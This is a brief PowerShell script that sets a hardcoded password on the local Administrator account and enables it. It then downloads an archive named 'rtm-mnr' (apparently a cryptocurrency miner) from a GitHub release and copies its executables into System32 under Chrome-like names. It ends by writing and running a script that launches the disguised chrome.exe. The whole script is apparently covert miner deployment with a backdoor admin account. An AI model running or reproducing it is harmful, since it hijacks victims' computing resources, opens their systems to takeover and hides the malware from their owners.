Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Pandajiwa123" -Force)
Get-LocalUser -Name "Administrator" | Enable-LocalUser
Invoke-WebRequest https://github.com/p4n1k/mnr/releases/download/winrtm/rtm-mnr.zip -OutFile rtm.zip
tar xf rtm.zip
Copy C:\chrome.exe C:\Windows\System32
Copy C:\chrome-checker.exe C:\Windows\System32
Copy C:\chrome-uninstaller.exe C:\Windows\System32
cmd /c echo ./chrome.exe >a.ps1
cmd /c echo ping -n 18001 127.0.0.1>nul >>a.ps1
.\a.ps1
